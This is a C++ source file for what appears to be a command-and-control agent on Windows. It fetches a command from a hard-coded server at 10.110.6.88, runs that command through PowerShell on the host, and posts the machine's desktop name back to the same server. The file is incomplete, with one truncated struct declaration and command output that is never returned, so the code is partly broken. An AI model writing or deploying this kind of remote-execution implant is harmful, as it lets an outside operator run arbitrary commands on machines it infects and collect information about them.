// Agent.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include "json.hpp"
#include <string>
#include <Windows.h>
#include <winhttp.h>
#include "functions.h"

#pragma comment(lib, "winhttp.lib")

using namespace std;
using json = nlohmann::json;

struct output {
    string consol_out;    
};

struct reg {
    string DesktopName;
};

struct Shell {
    string cmd;
};

struct PS

int main()
{

    //http get request and parse json response to struct
    string resp = Get("10.110.6.88", "/tasks");

    json j = json::parse(resp);
    std::cout << j.dump() << std::endl;

    Shell shell{
        j["cmd"].get<std::string>()
    };
    std::cout << "Argument to execute: " << shell.cmd << std::endl;
    //const char* c = cmmnd.cmd.c_str();
    string out = execPS("powershell " + shell.cmd);
    cout << out << endl;

    // http post request with json data & struct to json

    //output Output{};
    //Output.consol_out = "IpConfigDataHere";

    string strPc = GetStrDesktopName();
    reg Reg{};
    Reg.DesktopName = strPc;

    json postdata = json{ {"DesktopName", Reg.DesktopName} };
    string strPost = postdata.dump();
    cout << strPost << std::endl;
    string post_resp = Post("10.110.6.88", "/reg", strPost);
}

